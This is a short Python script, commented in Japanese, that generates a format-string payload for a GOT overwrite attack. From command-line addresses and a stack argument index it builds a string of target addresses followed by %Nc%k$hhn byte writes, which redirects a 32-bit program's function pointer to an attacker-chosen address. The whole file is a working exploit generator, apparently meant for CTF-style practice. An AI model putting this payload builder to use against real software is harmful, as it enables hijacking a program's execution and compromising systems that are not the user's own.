# create GOT Overwrite Attack shellcode
import sys
import re

start_address = int(sys.argv[1][2:], 16) # 0x80499f4(GOT対象アドレス)
values = re.split('(..)', sys.argv[2][2:])[1::2] # 0x8048691(飛ばしたいアドレス)
values.reverse() # little endian
number = int(sys.argv[3]) # 6番目
output = ''
byte_counter = 0

# address
for i in range(0, len(values)):
    addresses = re.split('(..)', '{:08x}'.format(start_address + i))[1::2]
    addresses.reverse()
    for item in addresses:
        output += '\\x' + item
        byte_counter = byte_counter + 1

# values
pre_value = byte_counter
for i in range(0, len(values)):
    number_of_char = 0
    value = int(values[i], 16)
    if value < pre_value:
        number_of_char = 256 - pre_value
        number_of_char = number_of_char + value
    else:
        number_of_char = value - pre_value
    pre_value = value

    output += '%{0}c%{1}$hhn'.format(number_of_char, number)
    number = number + 1

# shell code
print(output)